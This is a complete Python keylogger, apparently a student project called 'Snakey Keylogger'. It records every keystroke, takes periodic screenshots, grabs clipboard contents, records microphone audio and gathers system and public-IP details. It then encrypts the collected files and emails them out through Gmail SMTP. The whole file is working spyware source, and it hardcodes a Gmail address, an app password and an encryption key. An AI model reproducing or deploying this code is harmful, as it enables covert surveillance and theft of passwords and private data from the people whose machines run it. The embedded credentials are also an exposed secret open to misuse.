# === Import Required Libraries ===
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import smtplib

import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener

import time
import os
from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet
import getpass
from requests import get

from PIL import ImageGrab

# === Configuration ===
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"

# Timing Configuration
monitor_time = 60
screenshot_interval = 30
email_address = "finalprojectkey1@gmail.com"
app_password = "guil bubm vfdy vtli"  # App Password
toaddr = "finalprojectkey1@gmail.com"

key = "NO5RhUvsS_PCxNbA1CPCGkhdq7D1VP6MgCGihuxTE4U="

file_path = "C:\\Users\\ktmdu\\PycharmProjects\\PythonProject\\.venv\\Project"
extend = "\\"
file_merge = file_path + extend

# === Function to Send Email ===
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Snakey - Keylogger Report"
    msg.attach(MIMEText("Here is the collected data report.", 'plain'))

    try:
        with open(attachment, 'rb') as file:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(file.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(p)
    except Exception as e:
        print(f"[ERROR] Could not attach file: {e}")
        return

    try:
        print("[INFO] Connecting to SMTP server securely...")
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:  # Using SSL
            server.login(fromaddr, app_password)
            server.sendmail(fromaddr, toaddr, msg.as_string())

        print("[SUCCESS] Email sent securely!")
    except smtplib.SMTPAuthenticationError:
        print("[ERROR] Authentication failed! Check App Password settings.")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

# === Function to Collect System Information ===
def computer_information():
    start_time = datetime.now()
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get public IP Address (API limit reached)\n")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

        f.write(f"Start Time: {start_time}\n")
        end_time = datetime.now()  # Capture end time
        f.write(f"End Time: {end_time}\n")
        f.write(f"Duration: {end_time - start_time}\n")

    # === Function to Capture Clipboard Data ===
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data + "\n")
        except:
            f.write("Clipboard could not be copied\n")

# === Function to Record Audio ===
def microphone():
    try:
        print("[INFO] Recording audio...")
        fs = 44100
        seconds = 10  # 10 seconds audio capture

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()

        if not os.path.exists(file_path):
            os.makedirs(file_path)

        write(file_path + extend + audio_information, fs, myrecording)
        print("[SUCCESS] Audio saved:", file_path + extend + audio_information)
    except Exception as e:
        print(f"[ERROR] Microphone recording failed: {e}")

# === Function to Capture Screenshots ===
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
    print("[INFO] Screenshot taken.")

# === Keylogger ===
def keylogger():
    count = 0
    keys = []
    start_time = time.time()
    next_screenshot_time = start_time + screenshot_interval  # First screenshot after 1 min

    def on_press(key):
        nonlocal keys, count, next_screenshot_time

        keys.append(str(key).replace("'", ""))
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

        if time.time() >= next_screenshot_time:
            screenshot()
            next_screenshot_time = time.time() + screenshot_interval  # Reset screenshot timer

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                if key == "Key.space":
                    f.write("\n")
                elif "Key" not in key:
                    f.write(key)

    def on_release(key):
        if time.time() >= start_time + monitor_time:  # Stop after 3 minutes
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# === Main Execution ===
if __name__ == "__main__":
    print("[INFO] Starting Snakey Keylogger...")

    keylogger()  # Run keylogger for 3 minutes

    print("[INFO] Monitoring complete. Preparing report...")

    screenshot()
    copy_clipboard()
    microphone()
    computer_information()

    # Encrypt logs before sending
    files_to_encrypt = [
        file_merge + system_information,
        file_merge + clipboard_information,
        file_merge + keys_information
    ]
    encrypted_file_names = [
        file_merge + system_information_e,
        file_merge + clipboard_information_e,
        file_merge + keys_information_e
    ]

    fernet = Fernet(key)

    for i in range(len(files_to_encrypt)):
        with open(files_to_encrypt[i], 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(encrypted_file_names[i], 'wb') as f:
            f.write(encrypted)

        send_email(encrypted_file_names[i], encrypted_file_names[i], toaddr)

    print("[SUCCESS] Report sent successfully!")
